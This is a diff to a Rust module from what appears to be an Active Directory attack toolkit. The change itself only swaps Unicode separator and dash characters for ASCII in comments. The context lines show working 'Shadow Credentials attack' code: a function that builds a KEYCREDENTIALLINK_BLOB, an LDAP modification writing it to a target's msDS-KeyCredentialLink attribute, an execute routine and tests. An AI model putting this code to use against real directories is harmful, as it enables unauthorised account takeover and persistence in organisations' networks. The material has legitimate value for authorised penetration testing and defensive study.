@@ -35,9 +35,9 @@ use overthrone_core::error::{OverthroneError, Result};
 use serde::{Deserialize, Serialize};
 use tracing::info;
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Public Types
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Configuration for Shadow Credentials attack
 #[derive(Debug, Clone)]
@@ -110,23 +110,23 @@ pub struct KeyPair {
     pub key_id: String,
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Key Credential Structure (KEYCREDENTIALLINK_BLOB per MS-ADTS §2.2.20)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build a `KEYCREDENTIALLINK_BLOB` binary value suitable for writing to
 /// the `msDS-KeyCredentialLink` attribute.
 /// The format is a 4-byte LE version (0x00000200) followed by a sequence
 /// of TLV entries: 2-byte LE length | 1-byte tag | `<length>` bytes of value.
 /// Tag assignments (MS-ADTS §2.2.20.1):
-///  0x01  KeyID          — SHA-256 of the SubjectPublicKeyInfo DER
-///  0x02  KeyHash        — SHA-256 of the entire blob (minus this entry), computed last
-///  0x03  KeyMaterial    — SubjectPublicKeyInfo in DER format
-///  0x04  KeyUsage       — 0x01 = NGC (Windows Hello / smartcard-logon key)
-///  0x05  KeySource      — 0x00 = AD
-///  0x09  DeviceId       — random GUID in little-endian bytes
-///  0x0A  CustomKeyInfo  — [0x01, 0x00] (version=1, flags=0)
-///  0x0C  KeyCreationTime— Windows FILETIME (100-ns ticks since 1601-01-01) as 8-byte LE
+///  0x01  KeyID          -- SHA-256 of the SubjectPublicKeyInfo DER
+///  0x02  KeyHash        -- SHA-256 of the entire blob (minus this entry), computed last
+///  0x03  KeyMaterial    -- SubjectPublicKeyInfo in DER format
+///  0x04  KeyUsage       -- 0x01 = NGC (Windows Hello / smartcard-logon key)
+///  0x05  KeySource      -- 0x00 = AD
+///  0x09  DeviceId       -- random GUID in little-endian bytes
+///  0x0A  CustomKeyInfo  -- [0x01, 0x00] (version=1, flags=0)
+///  0x0C  KeyCreationTime-- Windows FILETIME (100-ns ticks since 1601-01-01) as 8-byte LE
 pub fn build_key_credential(public_key_der: &[u8], device_id_bytes: &[u8; 16]) -> Vec<u8> {
     use sha2::{Digest, Sha256};
 
@@ -162,9 +162,9 @@ pub fn build_key_credential(public_key_der: &[u8], device_id_bytes: &[u8; 16]) -
         .saturating_mul(10_000_000);
     let creation_time = filetime.to_le_bytes();
 
-    // Build blob without KeyHash (tag 0x02) first — hash is computed over this
+    // Build blob without KeyHash (tag 0x02) first -- hash is computed over this
     let mut blob = Vec::new();
-    blob.extend_from_slice(&0x0000_0200u32.to_le_bytes()); // Version = 0x00000200 LE → [0x00, 0x02, 0x00, 0x00]
+    blob.extend_from_slice(&0x0000_0200u32.to_le_bytes()); // Version = 0x00000200 LE -> [0x00, 0x02, 0x00, 0x00]
     blob.extend_from_slice(&tlv(0x01, &key_id)); // KeyID
     blob.extend_from_slice(&tlv(0x03, public_key_der)); // KeyMaterial
     blob.extend_from_slice(&tlv(0x04, &key_usage)); // KeyUsage
@@ -208,9 +208,9 @@ pub fn generate_key_id() -> String {
     uuid.to_string()
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  LDAP Operations
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build the LDAP modification for msDS-KeyCredentialLink
 pub fn build_ldap_modification(key_cred: &KeyCredential) -> String {
@@ -284,9 +284,9 @@ fn format_guid_from_hex(hex: &str) -> Option<String> {
     ))
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Attack Implementation
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Execute the Shadow Credentials attack
 /// This function:
@@ -394,7 +394,7 @@ pub async fn execute(
         error: if ldap_write_ok {
             None
         } else {
-            Some("LDAP write not confirmed — apply key material manually".to_string())
+            Some("LDAP write not confirmed -- apply key material manually".to_string())
         },
     })
 }
@@ -500,9 +500,9 @@ fn generate_key_pair(key_size: u16) -> Result<KeyPair> {
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Tests
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 #[cfg(test)]
 mod tests {
@@ -546,7 +546,7 @@ mod tests {
 
         let mod_value = build_ldap_modification(&cred);
         // Correct DN-with-Binary format: B:<hex_char_count>:<hex_data>:<DN>
-        // raw_value = [0x01, 0x00] → 2 bytes → 4 hex chars → "0100"
+        // raw_value = [0x01, 0x00] -> 2 bytes -> 4 hex chars -> "0100"
         assert!(mod_value.starts_with("B:4:0100:"));
         assert!(mod_value.ends_with("CN=Test,CN=Users,DC=domain,DC=local"));
     }
